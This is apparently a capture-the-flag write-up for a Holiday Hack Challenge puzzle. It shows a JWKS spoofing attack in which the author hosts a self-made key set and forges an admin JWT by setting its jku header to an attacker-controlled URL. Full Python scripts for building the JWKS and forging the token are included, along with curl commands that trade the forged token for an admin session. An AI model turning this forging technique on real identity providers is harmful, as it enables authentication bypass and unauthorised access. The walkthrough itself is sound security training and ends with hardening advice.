---
icon: material/text-box-outline
---

# Rogue Gnome Identity Provider

![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_0.png)

**Difficulty**: :fontawesome-solid-star::fontawesome-solid-star::fontawesome-regular-star::fontawesome-regular-star::fontawesome-regular-star:<br/>
**Direct link**: [Rogue Gnome Identity Provider](https://hhc25-wetty-prod.holidayhackchallenge.com/?&challenge=termRogueGnome){:target="_blank" rel="noopener"}<br/>
**Area**: The Park<br/> 
**In-game avatar**: Paul Beckett


## Hints
??? tip "Rogue Gnome IDP"
    It looks like the JWT uses JWKS. Maybe a JWKS spoofing attack would work.
??? tip "Rogue Gnome IDP"
    https://github.com/ticarpi/jwt_tool/wiki and https://portswigger.net/web-security/jwt have some great information on analyzing JWT's and performing JWT attacks.
??? tip "Rogue Gnome IDP"
    If you need to host any files for the attack, the server is running a webserver available locally at http://paulweb.neighborhood/.<br/> 
    The files for the site are stored in ~/www <br/>

## Objective

!!! question "Request"
   Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?

??? quote "Paul Beckett"
        As a pentester, I proper love a good privilege escalation challenge, and that's exactly what we've got here.<br/>
        The challenge website notes the router firmware version and the hardware version at the bottom.<br/>
        I've got access to a Gnome's Diagnostic Interface at gnome-48371.atnascorp with the creds gnome:SittingOnAShelf, but it's just a low-privilege account.<br/>
        The gnomes are getting some dodgy updates, and I need admin access to see what's actually going on.<br/>
        Ready to help me find a way to bump up our access level, yeah?



## High-Level Steps

1. **Observe** – Analyze the JWT authentication flow and trust relationships.
2. **Forge** – Create a malicious JWKS and generate an admin JWT.
3. **Access** – Authenticate as admin and extract the firmware details.

```mermaid
%%{init: {"themeVariables": {
  "fontSize": "25px",
  "nodeTextSize": "18px",
  "clusterTextSize": "22px"
}}}%%
flowchart TD

  subgraph Row1["Observe"]
    direction LR
    A[Authenticate to IdP]
    B[Capture and analyze JWT]
    A --> B
  end

  subgraph Row2["Forge"]
    direction LR
    C[Generate RSA key pair]
    D[Host malicious JWKS]
    E[Forge admin JWT]
    C --> D --> E
  end

  subgraph Row3["Access"]
    direction LR
    F[Exchange forged JWT for session]
    G[Access admin interface]
    H[Identify firmware image]
    I[Objective completed]
    F --> G --> H --> I
  end

  Row1 --> Row2
  Row2 --> Row3
```
## Solution

The challenge console mentions a file named ~/notes. </br>

![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_1.png)


### Details in the file named ~/notes
??? tip "Notes"
    **Captured Gnome**
    curl http://gnome-48371.atnascorp/

    **ATNAS Identity Provider (IdP):**
    curl http://idp.atnascorp/

    **My CyberChef website:**
    curl http://paulweb.neighborhood/
    ### My CyberChef site html files:
    ~/www/


    **Credentials**

    **Gnome credentials (found on a post-it):**
    Gnome:SittingOnAShelf


    **Curl Commands Used in Analysis of Gnome:**

    **Gnome Diagnostic Interface authentication required page:**
    curl http://gnome-48371.atnascorp

    **Request IDP Login Page**
    curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth

    **Authenticate to IDP**
    curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login

    **Pass Auth Token to Gnome**
    curl -v http://gnome-48371.atnascorp/auth?token=<insert-JWT>

    **Access Gnome Diagnostic Interface**
    curl -H 'Cookie: session=<insert-session>' http://gnome-48371.atnascorp/diagnostic-interface

    **Analyze the JWT**
    jwt_tool.py <insert-JWT>

We follow the below steps in the below order : <br/>

 - In the challenge
    - Authenticate and get the JWT token
    - Pass Auth Token to Gnome
 - In local kali
    - Create the private and public key pair
    - Generate the JWKS content
    - Generate the JWT content with JWKS url
 - In the challenge
    - Use JWT to generate the session id for admin user
    - Use session id to authenticate as admin

#### Authenticate and get the JWT token

```
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login
```

![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_2.png)

```bash linenums="1" title="JWT token"
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTQyNjgyNCwiZXhwIjoxNzY1NDM0MDI0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.JqykARKZRSm4TcWPaHfesn55Ew9mQy_nw3ysKO8sZmpGch5VqfkiD5FGH85p2pPP-cZ4Q6PAgBxjL_JJ7FSBrrA896uZAnehx86IowY9pyuSJ-aDDtG6Gu_ChpWlCm809hb8_66L6pwss4qCHfwIclhEYJ9Di0V9binaTQNDVys8txL_HPIF2-lHx2y8sKw3i5w1Hl-1fUhglzUSrFGIk2oTHduucRFU-IwalkrX192Ya2c_U-vgTYSnASUzCu8LNzgZiKSpvYLiFoaScLya8hbvW051SnpGTrOmu34M1U1dK6tUqlvnSFUpDObw-bvK2fl7tn0CmRr0xfuhHaR6jQ
```

#### Pass Auth Token to Gnome
```
curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTQyNjgyNCwiZXhwIjoxNzY1NDM0MDI0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.JqykARKZRSm4TcWPaHfesn55Ew9mQy_nw3ysKO8sZmpGch5VqfkiD5FGH85p2pPP-cZ4Q6PAgBxjL_JJ7FSBrrA896uZAnehx86IowY9pyuSJ-aDDtG6Gu_ChpWlCm809hb8_66L6pwss4qCHfwIclhEYJ9Di0V9binaTQNDVys8txL_HPIF2-lHx2y8sKw3i5w1Hl-1fUhglzUSrFGIk2oTHduucRFU-IwalkrX192Ya2c_U-vgTYSnASUzCu8LNzgZiKSpvYLiFoaScLya8hbvW051SnpGTrOmu34M1U1dK6tUqlvnSFUpDObw-bvK2fl7tn0CmRr0xfuhHaR6jQ
```
We get a session id. <br/>
![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_3.png)


When we try to get the session cookie value to access the diagnostic interface, we get <br/>
"Diagnostic access is only available to admins."<br/>
```
curl -H 'Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aTpHxg.wy7rETOD5wTKVvfzoJmz5SRH0g0' http://gnome-48371.atnascorp/diagnostic-interface
```
![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_4.png)


So - question is how we can get a authenticate to the gnome-48371.atnascorp to get an admin session which we can use to access teh diagnostic interface?

#### Creating the private and public key pair
```
openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -in private.pem -pubout -out public.pem
```
![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_5.png)

Public and private key pair is created. <br/>
![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_6.png)

#### Generate jwks payload - create_jwks.py
We generate the JWKS content using the public cert.<br/>
This is the content we can host and serve from http://paulweb.neighborhood/<br/>

??? tip "Script to create the JWKS"
    ```py linenums="1" title="create_jwks.py"
    import sys
    import os
    import json
    import base64
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.asymmetric import rsa

    def base64url_uint(val):
        return base64.urlsafe_b64encode(
            val.to_bytes((val.bit_length() + 7) // 8, 'big')
        ).decode('utf-8').rstrip("=")

    def generate_jwks(public_key_path, kid="idp-key-2025", output_path="jwks.json"):
        # Load PEM public key
        with open(public_key_path, "rb") as f:
            pub_key = serialization.load_pem_public_key(f.read(), backend=default_backend())

        if not isinstance(pub_key, rsa.RSAPublicKey):
            raise ValueError("Provided key is not an RSA public key.")

        numbers = pub_key.public_numbers()
        n = base64url_uint(numbers.n)
        e = base64url_uint(numbers.e)

        jwks = {
            "keys": [
                {
                    "kty": "RSA",
                    "kid": kid,
                    "use": "sig",
                    "n": n,
                    "e": e
                }
            ]
        }

        with open(output_path, "w") as f:
            json.dump(jwks, f, indent=2)

        print(f"[+] JWKS saved to: {output_path}")

    if __name__ == "__main__":
        if len(sys.argv) < 2:
            print("Usage: python generate_jwks.py /path/to/public.pem [kid] [output_file]")
            sys.exit(1)

        pubkey_file = sys.argv[1]
        kid = sys.argv[2] if len(sys.argv) > 2 else "idp-key-2025"
        outfile = sys.argv[3] if len(sys.argv) > 3 else "jwks.json"

        generate_jwks(pubkey_file, kid, outfile)
    ```

Run and get the jwks file (jwks.json) with the public key<br>
```
python create_jwks.py public.pem
cat jwks.json
```
![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_7.png)

In the game, we save the jwks.json under ~/www which is the home directory for http://paulweb.neighborhood/.<br/>
```
cd ~/www/
echo '{
  "keys": [
    {
      "kty": "RSA",
      "kid": "idp-key-2025",
      "use": "sig",
      "n": "y7f3Y1UfwzOa6kmOK8YPNBThxblOEjjRfgtOeLWbO0gHrnCeEFhsGNvWRroX6bvwIEekgRBAch7-ikbIVve4r1G41PhH9UBwggglsOE41MEN8oe6G3tySbP3T95O2OiGqhMU4Ot_WYfQJk3K9r7Qe13JmCGuG_jBBh4ZjcOyiczct1qMqapYFJvHSbXZoHBoEEiq-8aGKoRM3eyODj1cBwrN9MkUo4HIPC2t6F6Meh8LkBuWoLsQKCTBIiy6U9aSOXl8tG1VlZJ0yP9UVwRULOTD-EayPsUZV5RQecp6iNEo7cURC1zEkgbu5-G0FIpvT3mBkCfI7nRjnYz1f4n5iw",
      "e": "AQAB"
    }
  ]
}' > jwks.json
```

![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_8.png)

We can confirm the jwks.json can be served from http://paulweb.neighborhood<br/>
![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_9.png)

Now we create the jwt with the scope role:Admin with jwks url pointing to the http://paul.neighborhood/jwk.json<br/>
Highlighed in the code is the scope (Admin=true) and the jku set to http://paulweb.neighborhood/jwks.json, th eone we created.

??? tip "Script to create the JWT"
    ```py linenums="1" hl_lines="14 22" title="create_jwt.py"
    import jwt 
    from datetime import datetime, timedelta

    # Read your private key from a PEM file
    with open("private.pem", "r") as key_file:
        private_key = key_file.read()

    # Define the payload (the claims you want in the token)
    payload = {
        "sub": "gnome",
        "iat": datetime.utcnow(),
        "exp": datetime.utcnow() + timedelta(hours=1),  # Token expires in 1 hour
        "iss": "http://idp.atnascorp/",
        "admin": True
    }

    # Define the header with algorithm, key ID, and jku
    headers = {
        "alg": "RS256",
        "typ": "JWT",
        "kid": "idp-key-2025",
        "jku": "http://paulweb.neighborhood/jwks.json"
    }

    # Encode the JWT
    token = jwt.encode(
        payload,
        private_key,
        algorithm="RS256",
        headers=headers
    )

    # Print the resulting token
    print(token)
    ```

Run the above script to get the jwt token <br/>
```
python create_jwt.py
```
![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_10.png)


In the game, use the above JWT to get the session id.
```
curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTUxNTIzOSwiZXhwIjoxNzY1NTE4ODM5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6IlRydWUifQ.rGu4Yc1fPGk6KLpRVfNS46MNKctCv1iNUyDIi3vOa0f-pIirc1Dzha2Nh1LlKj3l4dteMZ8ih_lx8RA7sa4_AZyzQ0jaJUTaNqxGXosepHfe4buqwhfO6Wz-iOc5C4xFrHgeD0xvKazrmzTOtpxpegx7JQjd6WF4eTHctoC9ePcopBSyHRQxDu1gTzSCCaB1GjzQwANoWUO5kJU6IpWyXhkgo7FA3XStvAKaR3Fj632usEfTRYuDyTPLtfxv_WB1lKy7CHrefj_Y0m5jPUN-gm5hHaRJz64HsGR1TMaKL0b6SkrbB0mmglmrClXLraSrTba-zQkfg6wsfadok2yBFQ
```
![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_11.png)

Use the session id above to login as admin to get the firmware details. <br/>
```
curl -H 'Cookie: session=eyJhZG1pbiI6IlRydWUiLCJ1c2VybmFtZSI6Imdub21lIn0.aTugbg.48Yi7Hebd6_DEJ3tCz-HKDYW1sw' http://gnome-48371.atnascorp/diagnostic-interface
```
![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_12.png)

It shows the firmware as : refrigeration-botnet.bin <br/>

We submit that as the answer and Its accepted.


!!! success "Answer"
```
refrigeration-botnet.bin
```
![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_13.png)
## Response
!!! quote "Paul Beckett"
    Brilliant work on that privilege escalation! You've successfully gained admin access to the diagnostic interface.<br/>
    Now we finally know what updates the gnomes have been receiving - proper good pentesting skills in action!


## Learnings
1. 1. A user-supplied URL in the `jku` claim can allow attackers to control the source of signing keys and forge trusted JWTs.

## Prevention & Hardening Notes
1. Never allow user-controlled `jku` values; JWKS locations should be hard-coded or strictly allowlisted on the server side.
